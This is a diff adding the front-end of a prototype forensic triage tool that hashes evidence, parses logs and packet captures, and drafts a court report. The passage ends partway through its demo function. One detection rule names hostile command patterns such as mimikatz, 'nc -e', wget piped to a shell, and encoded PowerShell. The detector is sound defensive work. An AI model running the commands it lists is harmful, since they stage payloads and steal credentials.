@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ISNAD – Explainable AI evidence triage with a verifiable chain of custody</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<style>
+:root{--bg:#09120f;--pn:#0f1b16;--pn2:#13231c;--tx:#e4ece7;--mu:#87a094;--ln:#21372d;--ac:#c9a24a;--gr:#2f8f6b;--s1:#2f9e6b;--s2:#d9a21b;--s3:#e8742a;--s4:#e5484d}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--tx);font:14px/1.5 "Segoe UI",Roboto,Arial,sans-serif;background-image:radial-gradient(ellipse at 50% -10%,#123226,transparent 60%)}
+.strip{background:#050b09;color:var(--mu);font:10px Consolas,monospace;letter-spacing:2px;text-align:center;padding:4px;border-bottom:1px solid var(--ln)}
+header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;padding:12px 24px;background:linear-gradient(180deg,#0e1f18,#0a1511);border-bottom:2px solid var(--ac)}
+.brand{display:flex;align-items:center;gap:12px}h1{margin:0;font:600 24px Consolas,monospace;letter-spacing:6px;color:#fff}.brand small{display:block;font:11px "Segoe UI",sans-serif;color:var(--mu);letter-spacing:.3px}
+.pill{font:11px Consolas,monospace;padding:4px 10px;border:1px solid var(--ln);color:var(--tx);background:#0a1511;letter-spacing:1px;text-transform:uppercase;margin-left:4px}
+nav{display:flex;gap:0;padding:0 24px;background:#0a1511;border-bottom:1px solid var(--ln);overflow-x:auto}
+nav button{background:none;border:0;border-bottom:3px solid transparent;padding:12px 18px;color:var(--mu);font:600 11px Consolas,monospace;letter-spacing:2px;text-transform:uppercase;cursor:pointer;white-space:nowrap}
+nav button.on{color:var(--ac);border-color:var(--ac);background:#0f1b16}
+main{padding:18px 24px;max-width:1400px;margin:auto}
+#drop{border:1px dashed #3a5a4b;background:var(--pn);padding:18px;text-align:center;margin-bottom:16px;color:var(--mu);position:relative}
+#drop:before{content:"EVIDENCE INTAKE";position:absolute;left:0;top:0;background:var(--ln);color:var(--ac);font:10px Consolas,monospace;letter-spacing:2px;padding:2px 10px}
+#drop.h{border-color:var(--ac);background:var(--pn2)}#drop b{color:var(--tx)}
+button.b{background:var(--ac);color:#0a1511;border:1px solid var(--ac);padding:7px 14px;font:700 11px Consolas,monospace;letter-spacing:1px;text-transform:uppercase;cursor:pointer;margin:4px}
+button.b.g{background:none;color:var(--ac)}button.b:hover{filter:brightness(1.15)}
+.grid{display:grid;gap:14px}.k{grid-template-columns:repeat(auto-fit,minmax(170px,1fr))}.two{grid-template-columns:repeat(auto-fit,minmax(340px,1fr))}
+.c{background:var(--pn);border:1px solid var(--ln);padding:16px 14px 14px;min-width:0;position:relative}
+.c h3{display:inline-block;margin:-16px 0 12px -14px;background:var(--ln);color:var(--ac);font:10px Consolas,monospace;letter-spacing:2px;text-transform:uppercase;padding:3px 10px}
+.kv{font:600 30px Consolas,monospace;color:#fff}.kl{font-size:11px;color:var(--mu);text-transform:uppercase;letter-spacing:1px}
+.bar{display:flex;align-items:center;gap:8px;margin:6px 0;font-size:12px}.bar i{display:block;height:12px;min-width:2px}
+.hist{display:flex;align-items:flex-end;gap:3px;height:110px}.hist div{flex:1;background:var(--gr);min-height:2px}.ax{display:flex;justify-content:space-between;font:10px Consolas,monospace;color:var(--mu)}
+.tw{overflow-x:auto}table{border-collapse:collapse;width:100%;font-size:12px}th{text-align:left;font:600 10px Consolas,monospace;text-transform:uppercase;letter-spacing:1px;color:var(--mu);border-bottom:1px solid var(--ac);padding:6px}
+td{padding:6px;border-bottom:1px solid var(--ln);vertical-align:top;word-break:break-word}.m{font-family:Consolas,monospace;font-size:11px}
+.sv{display:inline-block;padding:1px 7px;color:#07100c;font:700 10px Consolas,monospace;letter-spacing:1px}.v0{background:#6f8579}.v1{background:var(--s1)}.v2{background:var(--s2)}.v3{background:var(--s3)}.v4{background:var(--s4);color:#fff}
+.al{border-left:3px solid;padding:6px 10px;margin:6px 0;background:var(--pn2);font-size:13px}.al.v1{border-color:var(--s1)}.al.v2{border-color:var(--s2)}.al.v3{border-color:var(--s3)}.al.v4{border-color:var(--s4)}.al small{display:block;color:var(--mu)}
+section{display:none}section.on{display:block}
+#rep{background:#fff;color:#111;padding:36px 44px;font:13px/1.6 Georgia,serif;border:1px solid var(--ln)}#rep h2{font:700 15px Georgia,serif;border-bottom:1px solid #333;margin-top:22px;padding-bottom:2px}#rep table{font-size:11px;color:#111}#rep th,#rep td{border:1px solid #bbb;color:#111}
+input.t{padding:6px;border:1px solid var(--ln);background:#0a1511;color:var(--tx);margin-right:8px}
+@media print{body>*:not(main){display:none}main>*:not(#v-rp){display:none!important}#rep{border:0;padding:0}.noprint{display:none}}
+</style></head><body>
+<div class="strip">DIGITAL FORENSICS WORKBENCH · الأدلة الجنائية الرقمية · PROTOTYPE · TEST AND SYNTHETIC DATA ONLY</div><header><div class="brand"><svg width="34" height="34" viewBox="0 0 40 40" fill="none" stroke="#c9a24a" stroke-width="1.7" stroke-linecap="round"><path d="M20 4a16 16 0 0 1 16 16"/><path d="M20 9a11 11 0 0 1 11 11v4"/><path d="M20 14a6 6 0 0 1 6 6v8"/><path d="M20 19v12"/><path d="M4 20a16 16 0 0 0 5 11.5"/><path d="M9 20a11 11 0 0 1 4-8.5"/><path d="M14 22v6"/></svg><div><h1>ISNAD</h1><small>Explainable AI evidence triage with a verifiable chain of custody</small></div></div><div><a class="pill" href="/siem" target="_blank" style="background:#c9a24a;color:#0a1511;border-color:#c9a24a;text-decoration:none;font-weight:700">OPEN SIEM DASHBOARD ▸</a> <span class="pill" id="sv">BACKEND: …</span> <span class="pill" id="st">IDLE</span> <span class="pill">LOCAL PROCESSING ONLY</span></div></header>
+<nav id="nv"><button data-v="dash" class="on">Overview</button><button data-v="ev">Evidence</button><button data-v="tl">Timeline</button><button data-v="lead">Leads</button><button data-v="fd">Findings</button><button data-v="rp">Court Report</button></nav>
+<main>
+<div id="drop"><b>Drop evidence here</b> (logs, CSV/JSON, PCAP, raw/dd images, binaries, anything) or
+<button class="b" onclick="document.getElementById('fi').click()">Select files</button><button class="b g" onclick="demo()">Load demo case</button><button class="b g" onclick="clr()">Clear case</button><button class="b g" onclick="tamper()">Tamper test</button>
+<input id="fi" type="file" multiple hidden><div style="font-size:12px;margin-top:4px">Every ingest updates all views instantly. Files above 64 MB are analysed on their first 64 MB and labelled as such.</div><div id="msg" style="margin-top:8px;font:12px Consolas,monospace;color:var(--ac)"></div></div>
+<section id="v-dash" class="on"></section><section id="v-ev"></section><section id="v-tl"></section><section id="v-lead"></section><section id="v-fd"></section>
+<section id="v-rp"><div class="noprint c" style="margin-bottom:12px">Case ID <input class="t" id="cid" value="ISNAD-2026-001"> Examiner <input class="t" id="exm" placeholder="Name / ID">
+<button class="b" onclick="mkrep()">Generate report</button><button class="b g" onclick="window.print()">Print / Save PDF</button><button class="b" onclick="dl('report.pdf')">Download court report (PDF)</button><button class="b" onclick="dl('triage.csv')">Download triage CSV</button><button class="b g" onclick="xl()">Export Excel</button><button class="b g" onclick="vl()">Verify custody ledger</button></div><div id="rep">Generate the report after ingesting evidence.</div></section>
+</main>
+<script>
+const $=s=>document.querySelector(s),CAP=64<<20,SV=['Info','Low','Medium','High','Critical'];
+const S={ev:[],tl:[],fd:[],ioc:{}};
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const hx=(b,n)=>[...b.subarray(0,n)].map(x=>x.toString(16).padStart(2,'0')).join('').toUpperCase();
+const sv=n=>`<span class="sv v${n}">${SV[n]}</span>`,iso=t=>t==null?'n/a':new Date(t).toISOString().replace('T',' ').slice(0,19)+'Z';
+async function sha(buf){return[...new Uint8Array(await crypto.subtle.digest('SHA-256',buf))].map(x=>x.toString(16).padStart(2,'0')).join('')}
+function ent(b){const n=Math.min(b.length,1<<20),c=new Uint32Array(256);for(let i=0;i<n;i++)c[b[i]]++;let e=0;for(const v of c)if(v){const p=v/n;e-=p*Math.log2(p)}return e}
+const SIG=[['FFD8FF','JPEG image','jpg'],['89504E47','PNG image','png'],['47494638','GIF image','gif'],['25504446','PDF document','pdf'],['504B0304','ZIP / Office container','zip'],['53514C697465','SQLite database','db'],['D4C3B2A1','PCAP capture','pcap'],['A1B2C3D4','PCAP capture','pcap'],['0A0D0D0A','PCAPNG capture','pcapng'],['456C6646696C65','Windows EVTX log','evtx'],['72656766','Registry hive','hve'],['4D5A','PE executable','exe'],['7F454C46','ELF executable','elf'],['4D444D50','Windows minidump','dmp'],['45564609','EnCase E01 image','e01'],['4B444D56','VMware VMDK','vmdk'],['514649FB','QCOW2 image','qcow2'],['4C694D45','LiME memory dump','lime']];
+const KN=['jpg','jpeg','png','gif','pdf','zip','txt','log','csv','json','db','sqlite','exe','docx','xlsx'];
+const nm=e=>({jpeg:'jpg',docx:'zip',xlsx:'zip',sqlite:'db'}[e]||e);
+const isText=b=>{const n=Math.min(b.length,4096);if(!n)return false;let p=0;for(let i=0;i<n;i++){const x=b[i];if(x===0)return false;if(x===9||x===10||x===13||(x>=32&&x<127)||x>=128)p++}return p/n>.95};
+const RULES=[[/log(s)? (was )?cleared|EventID.?1102|Event ID: ?1102/i,4,'Anti-forensics: log cleared','Clearing audit logs is a recognised attempt to remove evidence of prior activity.'],
+[/powershell.*(-enc|-nop|bypass)|certutil.*urlcache|mimikatz|nc -e|wget [^|]*\|\s*(ba)?sh|base64 -d/i,4,'Suspicious command execution','Command-line pattern commonly used for payload staging, credential theft or obfuscation.'],
+[/useradd|net user .*\/add|EventID.?4720/i,3,'Account creation','New accounts can indicate persistence if not tied to an approved change.'],
+[/EventID.?7045|service installed|schtasks|crontab -/i,3,'Persistence mechanism','Service or scheduled-task creation is a typical persistence technique.'],
+[/sudo|su: |EventID.?4672|EventID.?4728/i,2,'Privilege use','Elevated privileges were used; correlate with the account and time of activity.'],
+[/Failed password|authentication failure|EventID.?4625|Event ID: ?4625/i,1,'Failed logon','Individually low risk; evaluated for burst patterns per source address.'],
+[/Accepted (password|publickey)|EventID.?4624/i,0,'Successful logon','Baseline authentication event used for correlation with failures.']];
+const IP=/\b(?:\d{1,3}\.){3}\d{1,3}\b/;
+function ioc(s){for(const[t,r]of[['IPv4',/\b(?:\d{1,3}\.){3}\d{1,3}\b/g],['URL',/https?:\/\/[^\s"'<>]+/g],['Email',/[\w.+-]+@[\w-]+\.[\w.-]+/g]])for(const m of s.match(r)||[]){const k=t+'|'+m;S.ioc[k]=(S.ioc[k]||0)+1}}
+function pts(l){let m=l.match(/(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2}:\d{2})/);if(m)return Date.parse(m[1]+'T'+m[2]+'Z');
+m=l.match(/^([A-Z][a-z]{2})\s+(\d+)\s(\d\d:\d\d:\d\d)/);if(m){const t=Date.parse(`${m[1]} ${m[2]} 2026 ${m[3]} UTC`);return isNaN(t)?null:t}return null}
+async function analyze(f){
+ const buf=await f.slice(0,CAP).arrayBuffer(),b=new Uint8Array(buf),ext=(f.name.split('.').pop()||'').toLowerCase();
+ const sg=SIG.find(s=>hx(b,16).startsWith(s[0])),tx=!sg&&isText(b);
+ const e={name:f.name,size:f.size,mod:f.lastModified,sha:await sha(buf),scope:f.size>CAP?'first 64 MB':'full file',ent:ent(b),kind:sg?sg[1]:tx?'Text / log':'Unrecognised binary',sc:0};
+ S.ev.push(e);let sr=null;try{const r=await fetch('/api/vault?name='+encodeURIComponent(f.name),{method:'POST',body:f});if(r.ok)sr=await r.json()}catch(x){}
+ const A=(sev,t,w,ts)=>S.fd.push({id:'F-'+String(S.fd.length+1).padStart(3,'0'),file:f.name,sev,t,w,ts:ts??null});
+ S.tl.push({ts:f.lastModified,file:f.name,type:'File modified (filesystem MAC)',detail:'Last-modified time of the evidence item as presented',sev:0,line:'-'});
+ if(sg&&KN.includes(ext)&&nm(ext)!==sg[2])A(3,'Extension / signature mismatch',`File is named .${ext} but its header identifies it as ${sg[1]}. Mismatches are used to disguise content.`);
+ if(e.ent>7.5&&f.size>1024)A(3,'High-entropy content',`Shannon entropy ${e.ent.toFixed(2)}/8.00 suggests encrypted, compressed or packed data that warrants further examination.`);
+ if(sr&&sr.parsed){sr.tl.forEach(t=>S.tl.push({...t,file:f.name}));sr.fd.forEach(x=>A(x.sev,x.t,x.w,x.ts));for(const k in sr.ioc)S.ioc[k]=(S.ioc[k]||0)+sr.ioc[k]}
+ else if(tx){const L=new TextDecoder().decode(b).split(/\r?\n/),F={},OK={};let off=0;
+  L.forEach((ln,i)=>{if(!ln.trim())return;ioc(ln);const ts=pts(ln),r=RULES.find(r=>r[0].test(ln));if(!r)return;const ip=(ln.match(IP)||[''])[0];
+   S.tl.push({ts,file:f.name,type:r[2],detail:ln.slice(0,220),sev:r[1],line:i+1});
+   if(r[1]>=2){A(r[1],r[2],r[3]+` (line ${i+1})`,ts);if(ts!=null&&new Date(ts).getUTCHours()<5)off++}
+   if(r[2]==='Failed logon')(F[ip]=F[ip]||[]).push(ts);if(r[2]==='Successful logon')OK[ip]=ts});
+  for(const ip in F)if(ip&&F[ip].length>=5){A(3,'Brute-force pattern',`${F[ip].length} failed logons from ${ip}, which exceeds the burst threshold of 5.`,F[ip][0]);if(OK[ip]!=null)A(4,'Successful logon after brute force',`${ip} authenticated successfully after repeated failures, consistent with credential compromise.`,OK[ip])}
+  if(off)A(2,'Activity outside business hours',`${off} elevated-risk event(s) between 00:00 and 05:00 UTC.`)}
+ else if(sg&&sg[2]==='pcap')pcap(f,b,A);
+ else if(sg&&sg[2]==='pcapng')pcap(f,b,A);
+ else{ioc(new TextDecoder('latin1').decode(b.subarray(0,8<<20)));
+  if(!sg||['e01','vmdk','qcow2'].includes(sg[2])||/^(dd|img|raw|bin|iso)$/.test(ext)){const hits={};let n=0;
+   for(let i=1;i<b.length-4&&n<500;i++){const x=b[i];let t=null;
+    if(x===255&&b[i+1]===216&&b[i+2]===255)t='JPEG';else if(x===137&&b[i+1]===80&&b[i+2]===78&&b[i+3]===71)t='PNG';else if(x===80&&b[i+1]===75&&b[i+2]===3&&b[i+3]===4)t='ZIP';else if(x===37&&b[i+1]===80&&b[i+2]===68&&b[i+3]===70)t='PDF';
+    if(t){(hits[t]=hits[t]||[]).push(i);n++}}
+   for(const t in hits){A(2,`Embedded ${t} signature(s) carved`,`${hits[t].length} ${t} header(s) found away from offset 0 (e.g. 0x${hits[t][0].toString(16)}). In a disk image these may be deleted or unallocated files and should be recovered with a full filesystem tool.`);
+    hits[t].slice(0,20).forEach(o=>S.tl.push({ts:null,file:f.name,type:'Carved '+t,detail:'Signature at offset 0x'+o.toString(16),sev:2,line:'off '+o}))}}}
+ if(!S.fd.some(x=>x.file===f.name))A(1,'No anomalies detected by current rules','Item was hashed and classified; no rule matched. This does not prove the item is benign.');
+}
+function pcap(f,b,A){const dv=new DataView(b.buffer,b.byteOffset,b.byteLength),P=[];let le=true;
+ if(hx(b,4)==='0A0D0D0A'){let p=0,lt=1;le=dv.getUint32(8,true)===0x1A2B3C4D;while(p+12<=b.length&&P.length<5e5){const ty=dv.getUint32(p,le),ln=dv.getUint32(p+4,le);if(ln<12||p+ln>b.length)break;if(ty===1)lt=dv.getUint16(p+8,le);if(ty===6)P.push([dv.getUint32(p+12,le)*4294967296+dv.getUint32(p+16,le),p+28,dv.getUint32(p+20,le),lt]);p+=ln}}
+ else{le=b[0]===0xD4;const lt=dv.getUint32(20,le);let p=24;while(p+16<=b.length&&P.length<5e5){const cap=dv.getUint32(p+8,le);if(p+16+cap>b.length)break;P.push([dv.getUint32(p,le)*1e6+dv.getUint32(p+4,le),p+16,cap,lt]);p+=16+cap}}
+ const sc={},fl={},cr=[];let by=0,cl=0,t0=null,ip4=0;
+ for(const[us,d,cap,lt]of P){const ts=Math.floor(us/1e3);by+=cap;if(t0==null)t0=ts;
+  const o=lt===1?(b[d+12]===8&&b[d+13]===0?d+14:-1):lt===113?(b[d+14]===8&&b[d+15]===0?d+16:-1):lt===101?d:-1;if(o<0||b[o]>>4!==4)continue;
+  const ih=(b[o]&15)*4,pr=b[o+9],s=b.subarray(o+12,o+16).join('.'),t=b.subarray(o+16,o+20).join('.');if(pr!==6&&pr!==17)continue;ip4++;
+  const q=o+ih,dp=(b[q+2]<<8)|b[q+3];(sc[s]=sc[s]||new Set()).add(t+':'+dp);fl[s+'>'+t]=(fl[s+'>'+t]||0)+cap;ioc(s+' '+t);
+  if([21,23,80,110,143].includes(dp))cl++;
+  if(pr===6){const po=q+((b[q+12]>>4)*4),pe=Math.min(d+cap,po+240);if(pe>po){const x=new TextDecoder('latin1').decode(b.subarray(po,pe)),m=x.match(/(?:^|\r?\n)(USER|PASS) \S+|Authorization: Basic|cpassword=|login: |Password: /i);if(m&&cr.length<50)cr.push([ts,m[0].trim().split(/[ =:]/)[0].toUpperCase(),s,t,dp])}}}
+ S.tl.push({ts:t0,file:f.name,type:'Capture start',detail:`${P.length} packets, ${by} bytes, ${ip4} IPv4 TCP/UDP`,sev:0,line:'-'});
+ cr.forEach(c=>S.tl.push({ts:c[0],file:f.name,type:'Cleartext credential exposure',detail:`${c[1]} (value withheld) ${c[2]} -> ${c[3]}:${c[4]}`,sev:3,line:'-'}));
+ if(cr.length)A(3,'Cleartext credential exposure',`${cr.length} packet(s) carry authentication material sent unencrypted (FTP/Telnet/HTTP Basic/GPP cpassword). Values are withheld here; review them in the source capture.`,cr[0][0]);
+ for(const s in sc)if(sc[s].size>=15)A(3,'Port-scan behaviour',`${s} contacted ${sc[s].size} distinct host:port pairs, which is consistent with reconnaissance.`,t0);
+ for(const k in fl)if(fl[k]>1e6)A(3,'Large outbound transfer',`${k.replace('>',' to ')} moved ${(fl[k]/1e6).toFixed(1)} MB, which may indicate data exfiltration and needs content review.`,t0);
+ if(cl)A(1,'Cleartext protocol use',`${cl} packets to FTP/Telnet/HTTP/POP3/IMAP ports; credentials or data may be exposed.`,t0);
+ if(!ip4)A(1,'No IPv4 TCP/UDP traffic decoded',`${P.length} packet(s) read but none decoded as IPv4 TCP/UDP (other link types or IPv6 are not parsed yet).`,t0)}
+function score(){S.ev.forEach(e=>{const s=S.fd.filter(x=>x.file===e.name).reduce((a,x)=>a+x.sev*x.sev,0);e.sc=Math.min(100,s*3);e.pr=e.sc>=60?'P1':e.sc>=30?'P2':e.sc>=9?'P3':'P4'})}
+async function ingest(fs){for(const f of fs){$('#st').textContent='ANALYSING '+f.name.slice(0,24).toUpperCase();await new Promise(r=>setTimeout(r,20));try{await analyze(f);$('#msg').textContent='Ingested '+f.name+' · case now has '+S.tl.length+' events and '+S.fd.length+' findings'}catch(x){$('#msg').textContent='ERROR analysing '+f.name+': '+x;S.fd.push({id:'F-ERR',file:f.name,sev:1,t:'Analysis error',w:String(x)})}score();render()}await push();$('#st').textContent='LIVE – UPDATED '+new Date().toISOString().slice(11,19)+'Z'}
+async function push(){try{const r=await fetch('/api/state',{method:'POST',body:JSON.stringify(S)}),j=await r.json();
+ if(r.status===409){$('#sv').textContent='TAMPER DETECTED – ANALYSIS REFUSED';alert('EVIDENCE TAMPER DETECTED\nHash mismatch for: '+j.items.join(', ')+'\nAnalysis refused; the event was recorded in the custody ledger.');await sync();return}
+ $('#sv').textContent=r.ok?'DB SYNCED · DIGEST '+(j.digest||'').slice(0,12):'BACKEND: ERROR'}catch(e){$('#sv').textContent='BACKEND: OFFLINE (run server.py)'}}
+async function sync(){try{Object.assign(S,await(await fetch('/api/state')).json());render()}catch(e){}}
+function clr(){S.ev=[];S.tl=[];S.fd=[];S.ioc={};render();push()}
+function dl(f){const a=document.createElement('a');a.href='/api/'+f+'?case='+encodeURIComponent($('#cid').value)+'&examiner='+encodeURIComponent($('#exm').value);a.click()}
+async function vl(){const r=await(await fetch('/api/ledger')).json();alert('Custody ledger entries: '+r.rows.length+'\nHash chain: '+(r.valid?'VALID':'BROKEN at entry '+r.bad))}
+function rv(f){const d=(S.dec||{})[f.id+'|'+f.file];return d?`<b>${d.decision.toUpperCase()}</b><br><span class="m">${esc(d.examiner||'')}</span>`:`<button class="b" onclick="dec('${f.id}','${esc(f.file)}','confirmed')">Confirm</button><button class="b g" onclick="dec('${f.id}','${esc(f.file)}','dismissed')">Dismiss</button>`}
+async function dec(id,file,d){const ex=$('#exm').value||prompt('Examiner name / ID');if(!ex)return;$('#exm').value=ex;await fetch('/api/decision',{method:'POST',body:JSON.stringify({fid:id,file,decision:d,examiner:ex})});await sync()}
+function tamper(){ingest([new File(['2026-11-03T09:12:01Z srv01 sshd[411]: Accepted publickey for analyst\ntampered line'],'auth_server01.log')])}
+fetch('/api/state').then(r=>r.json()).then(s=>{if(s.ev&&s.ev.length){Object.assign(S,s);render()}$('#sv').textContent='BACKEND: ONLINE'}).catch(()=>$('#sv').textContent='BACKEND: OFFLINE (run server.py)');
+const topf=()=>[...S.fd].sort((a,b)=>b.sev-a.sev);
+function render(){
+ const sv4=[0,0,0,0,0];S.fd.forEach(f=>sv4[f.sev]++);const mx=Math.max(1,...sv4.slice(1)),h=Array(24).fill(0);S.tl.forEach(t=>{if(t.ts!=null&&t.sev>0)h[new Date(t.ts).getUTCHours()]++});const hm=Math.max(1,...h);
+ const iocs=Object.entries(S.ioc).sort((a,b)=>b[1]-a[1]),pm=S.ev.reduce((a,e)=>Math.max(a,e.sc),0);
+ $('#v-dash').innerHTML=`${S.ev.length?'':'<div class="c" style="margin-bottom:14px"><h3>Awaiting evidence</h3>Drop a log, Zeek conn.log, PCAP/PCAPNG or disk image above, or load the demo case. Every ingest is hashed, vaulted and recorded in the custody ledger.</div>'}<div class="grid k">${[['Evidence items',S.ev.length],['Timeline events',S.tl.length],['Findings',S.fd.length],['Indicators (IOC)',iocs.length],['Top triage score',pm+'/100']].map(x=>`<div class="c"><div class="kv">${x[1]}</div><div class="kl">${x[0]}</div></div>`).join('')}</div>
+ <div class="grid two" style="margin-topf:14px"><div class="c"><h3>Findings by severity</h3>${[4,3,2,1].map(i=>`<div class="bar"><span style="width:62px">${SV[i]}</span><i class="v${i}" style="width:${sv4[i]/mx*60}%"></i>${sv4[i]}</div>`).join('')}</div>
+ <div class="c"><h3>Suspicious events by hour (UTC)</h3><div class="hist">${h.map((v,i)=>`<div title="${i}:00 – ${v}" style="height:${v/hm*100}%"></div>`).join('')}</div><div class="ax"><span>00</span><span>06</span><span>12</span><span>18</span><span>23</span></div></div>
+ <div class="c"><h3>Live alert feed</h3>${topf().slice(0,7).map(f=>`<div class="al v${f.sev}"><b>${esc(f.t)}</b> ${sv(f.sev)}<small>${esc(f.file)} · ${iso(f.ts)}</small></div>`).join('')||'<span class="kl">No data yet. Load evidence to begin.</span>'}</div>
+ <div class="c"><h3>Top indicators</h3><div class="tw"><table>${iocs.slice(0,8).map(([k,v])=>`<tr><td class="m">${esc(k.split('|')[0])}</td><td class="m">${esc(k.split('|')[1])}</td><td>${v}</td></tr>`).join('')}</table></div></div></div>
+ <div class="c" style="margin-topf:14px"><h3>Triage queue</h3>${evt()}</div>`;
+ $('#v-ev').innerHTML=`<div class="c">${evt(1)}</div>`;
+ $('#v-tl').innerHTML=`<div class="c tw"><table><tr><th>Timestamp (UTC)</th><th>Source</th><th>Event</th><th>Sev</th><th>Ref</th><th>Detail</th></tr>${tls().slice(0,1500).map(t=>`<tr><td class="m">${iso(t.ts)}</td><td>${esc(t.file)}</td><td>${esc(t.type)}</td><td>${sv(t.sev)}</td><td class="m">${t.line}</td><td class="m">${esc(t.detail)}</td></tr>`).join('')}</table></div>`;
+ $('#v-fd').innerHTML=`<div class="c tw"><table><tr><th>ID</th><th>Sev</th><th>Finding</th><th>Source</th><th>Why it matters</th><th>Examiner review</th></tr>${topf().map(f=>`<tr><td class="m">${f.id}</td><td>${sv(f.sev)}</td><td><b>${esc(f.t)}</b></td><td>${esc(f.file)}</td><td>${esc(f.w)}</td><td>${rv(f)}</td></tr>`).join('')}</table></div>`}
+const tls=()=>[...S.tl].sort((a,b)=>(a.ts??9e15)-(b.ts??9e15));
+function evt(full){return`<div class="tw"><table><tr><th>Priority</th><th>Score</th><th>Item</th><th>Type</th><th>Size (B)</th><th>Entropy</th>${full?'<th>Modified</th><th>SHA-256 ('+'scope)</th>':''}</tr>${[...S.ev].sort((a,b)=>b.sc-a.sc).map(e=>`<tr><td><b>${e.pr}</b></td><td>${e.sc}</td><td>${esc(e.name)}</td><td>${e.kind}</td><td>${e.size}</td><td>${e.ent.toFixed(2)}</td>${full?`<td class="m">${iso(e.mod)}</td><td class="m">${e.sha}<br>${e.scope}</td>`:''}</tr>`).join('')}</table></div>`}
+function xl(){if(typeof XLSX==='undefined')return alert('SheetJS did not load (offline?). Reconnect and retry.');const w=XLSX.utils.book_new(),a=(n,r)=>XLSX.utils.book_append_sheet(w,XLSX.utils.json_to_sheet(r),n);
+ a('Evidence',S.ev.map(e=>({Item:e.name,Type:e.kind,SizeBytes:e.size,SHA256:e.sha,HashScope:e.scope,Entropy:+e.ent.toFixed(3),ModifiedUTC:iso(e.mod),TriageScore:e.sc,Priority:e.pr})));
+ a('Timeline',tls().map(t=>({TimestampUTC:iso(t.ts),Source:t.file,Event:t.type,Severity:SV[t.sev],Ref:t.line,Detail:t.detail})));
+ a('Findings',topf().map(f=>({ID:f.id,Severity:SV[f.sev],Finding:f.t,Source:f.file,Explanation:f.w,TimeUTC:iso(f.ts)})));
+ a('Indicators',Object.entries(S.ioc).map(([k,v])=>({Type:k.split('|')[0],Value:k.split('|')[1],Count:v})));XLSX.writeFile(w,($('#cid').value||'ISNAD')+'_triage.xlsx')}
+function mkrep(){const d=new Date().toISOString(),cr=topf().filter(f=>f.sev>=3),T=tls().filter(t=>t.ts!=null&&t.sev>=2);
+ $('#rep').innerHTML=`<h2 style="margin-topf:0;font-size:19px">DIGITAL FORENSIC TRIAGE REPORT</h2><p>Case ID: <b>${esc($('#cid').value)}</b> · Examiner: <b>${esc($('#exm').value||'[to be completed]')}</b> · Generated: ${d}<br>Tool: ISNAD prototype v0.1 (AI-assisted triage, rule-based analytics). <b>Status: preliminary, pending examiner validation.</b></p>
+<h2>1. Scope and purpose</h2><p>This report documents automated triage of ${S.ev.length} evidence item(s) to identify items and events of investigative priority, and to record how each result was reached.</p>
+<h2>2. Evidence integrity</h2><p>Each item was read in read-only mode and hashed with SHA-256 before analysis. Hash scope is stated per item. Hashes must be re-verified against acquisition records before reliance in court.</p>
+<table><tr><th>Item</th><th>Type</th><th>Size</th><th>SHA-256</th><th>Scope</th><th>Priority</th></tr>${S.ev.map(e=>`<tr><td>${esc(e.name)}</td><td>${e.kind}</td><td>${e.size}</td><td class="m">${e.sha}</td><td>${e.scope}</td><td>${e.pr}</td></tr>`).join('')}</table>
+<h2>3. Methodology</h2><p>(a) File-signature identification and extension comparison; (b) Shannon entropy; (c) timestamp normalisation to UTC; (d) rule-based event classification and burst detection for authentication logs; (e) packet-header analysis of PCAP files for scanning and bulk transfer; (f) signature carving of embedded files; (g) extraction of indicators (IPs, URLs, emails); (h) weighted triage scoring. Every finding records the rule that produced it so it can be reproduced.</p>
+<h2>4. Findings (severity High and above)</h2>${cr.length?'<table><tr><th>ID</th><th>Sev</th><th>Finding</th><th>Source</th><th>Basis</th><th>Time (UTC)</th></tr>'+cr.map(f=>`<tr><td>${f.id}</td><td>${SV[f.sev]}</td><td>${esc(f.t)}</td><td>${esc(f.file)}</td><td>${esc(f.w)}</td><td>${iso(f.ts)}</td></tr>`).join('')+'</table>':'<p>No High or Critical findings.</p>'}
+<h2>5. Chronology of significant events</h2>${T.length?'<table><tr><th>Time (UTC)</th><th>Source</th><th>Event</th><th>Detail</th></tr>'+T.slice(0,60).map(t=>`<tr><td>${iso(t.ts)}</td><td>${esc(t.file)}</td><td>${esc(t.type)}</td><td>${esc(t.detail)}</td></tr>`).join('')+'</table>':'<p>No significant timed events.</p>'}
+<h2>6. Indicators of compromise</h2><p>${Object.keys(S.ioc).slice(0,25).map(k=>esc(k.replace('|',': '))).join('; ')||'None extracted.'}</p>
+<h2>7. Limitations</h2><p>This prototype does not mount filesystems, parse EVTX or registry structures, recover deleted files by filesystem metadata, or decode EXIF. Carved signatures are candidates, not confirmed files. Files above 64 MB are analysed on their first 64 MB only. Rule-based and statistical indicators suggest, but do not prove, malicious activity. Legitimate administration can produce similar patterns.</p>
+<h2>8. Conclusion (draft for examiner review)</h2><p>Of ${S.ev.length} item(s) examined, ${S.fd.filter(f=>f.sev>=4).length} Critical and ${S.fd.filter(f=>f.sev===3).length} High finding(s) were recorded. ${cr.length?'The indicators are consistent with unauthorised access activity and warrant full examination of the highest-priority items (see triage queue). ':'No high-severity indicators were identified by the current rules. '}These conclusions are limited to the stated methodology and must be confirmed by a qualified examiner using validated tools.</p>
+<h2>9. Examiner declaration</h2><p>I confirm the contents of this report are accurate to the best of my knowledge and that I have reviewed the automated results.<br><br>Signature: ____________________ Date: ____________</p>`}
+function demo(){const L=['2026-11-03T09:12:01Z srv01 sshd[411]: Accepted publickey for analyst from 10.0.0.12 port 51122','2026-11-03T14:40:19Z srv01 sudo: analyst : TTY=pts/0 ; COMMAND=/usr/bin/apt update'],ip='203.0.113.45';
+ for(let i=0;i<8;i++)L.push(`2026-11-04T02:14:0${i}Z srv01 sshd[902]: Failed password for root from ${ip} port 4${i}221`);
